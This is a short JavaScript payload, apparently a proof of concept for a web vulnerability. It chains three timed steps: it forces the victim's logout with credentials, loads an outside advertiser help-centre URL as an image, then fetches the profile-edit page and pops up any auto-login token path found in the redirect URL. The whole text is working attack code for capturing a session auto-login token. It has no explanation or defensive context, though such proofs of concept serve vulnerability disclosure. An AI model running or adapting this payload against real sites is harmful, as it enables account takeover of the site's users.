// Step1
let step1=new XMLHttpRequest();
step1.withCredentials=true;
step1.open("GET","/member/logout")
step1.send();
// Step 2
setTimeout(()=>{ 
let step2=new Image();
step2.src="https://advertiser.trafficjunky.com/help-center";},5000)

// Final Step
setTimeout(()=>{ 
fetch('/member/editprofile').then((response) => response).then((data) => alert(data.url.match(/\autologin\/.+/g)));},7500)
